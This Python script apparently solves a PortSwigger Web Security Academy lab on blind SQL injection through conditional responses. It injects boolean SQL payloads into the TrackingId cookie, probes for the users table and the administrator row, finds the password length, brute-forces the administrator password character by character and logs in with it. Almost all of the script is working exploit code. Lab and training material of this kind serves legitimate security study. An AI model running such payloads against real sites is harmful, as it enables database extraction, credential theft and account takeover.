#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
from utils import *
import re
import sys

url="https://0abe00da045ab3e980af9fe300da00da.web-security-academy.net/filter?category=Pets"

def evalutate(soup):
    if "Welcome back" in soup.text:return True
    return False

def forge_overhead(org_response,payload):
    forged_cookies=org_response.cookies
    forged_headers=org_response.headers
    org_tracking_id=org_response.headers['Set-cookie']

    pattern = r"TrackingId=(\w+)"
    tracking_id=re.search(pattern,org_tracking_id).group(1)
    
    payload=f"{tracking_id}{payload}"
    forged_tracking_id=re.sub(pattern,payload,org_tracking_id)

    forged_headers['Set-cookie']=f"Tracking_id={forged_tracking_id}"
    forged_cookies['TrackingId']=forged_tracking_id

    return forged_headers,forged_cookies

session=requests.Session()
response=session.get(url)
soup=parse_html(response)

payload="'"
forged_headers,forged_cookies=forge_overhead(response,payload)

response=session.get(url,headers=forged_headers,cookies=forged_cookies)

soup=parse_html(response)
if evalutate(soup)==False:
    print('[+] sqli vulnerablity possible')
else: 
    sys.exit("[-] Something went wrong check your payload, exiting")

#by gere we can start automating it

print('[+] testing different payloads')

texts=[
    "[-] Something went wrong",
    "[+] There is a table called users",
    "[+] There is a column called username in users"
    ]
payloads=[
    f"' and '1'=", #should evaluate to False
    f"' and (select 'a' from users limit 1)='a", #should be True
    f"' and (select 'a' from users where username='administrator')='a" #should be True
    ]

for payload,text in zip(payloads,texts):
    session=requests.Session()
    response=session.get(url)
    forged_headers,forged_cookies=forge_overhead(response,payload)

    response=session.get(url,headers=forged_headers,cookies=forged_cookies)
    if evalutate(parse_html(response)):print(text)
    
#getting length of password
print("[+] Getting password length")
for length in range(1,50):
    session=requests.Session()
    response=session.get(url)
    payload=f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>={length})='a"
    forged_headers,forged_cookies=forge_overhead(response,payload)
    response=session.get(url,headers=forged_headers,cookies=forged_cookies)
    if evalutate(parse_html(response))==False:
        print(f"[+] The password is of length {length-1}")
        break

#Brute forcing the password

alphanum="abcdefghijklmnopqrstuvwxyz123456789"
session=requests.Session()
org_response=session.get(url)
forged_cookies=org_response.cookies
forged_headers=org_response.headers
org_tracking_id=org_response.headers['Set-cookie']

pattern = r"TrackingId=(\w+)"
tracking_id=re.search(pattern,org_tracking_id).group(1)

password=''
print('[+] brute forcing password')
for idx in range(1,21):
    for letter in alphanum:
        payload=f"' AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator')='{letter}"
        forged_tracking_id=f"{tracking_id}{payload}"
        forged_headers['Set-cookie']=f"Tracking_id={forged_tracking_id}"
        forged_cookies['TrackingId']=forged_tracking_id

        response=session.get(url,headers=forged_headers,cookies=forged_cookies)
        if evalutate(parse_html(response)):
            print(f"letter at index {idx} is {letter}")
            password+=letter
            break
        else:print(f'fired up {letter} at index {idx}')
print("password: ",password)

#password="4btzrv7oy78fuf7fgo3j"

session=requests.Session()
url='https://0abe00da045ab3e980af9fe300da00da.web-security-academy.net/login'
response=session.get(url)
token=parse_html(response).find('input')['value']

data={
    "username":"administrator",
    "password":password,
    "csrf":token
}
response=session.post(url,data=data)
print(check_succes(parse_html(response)))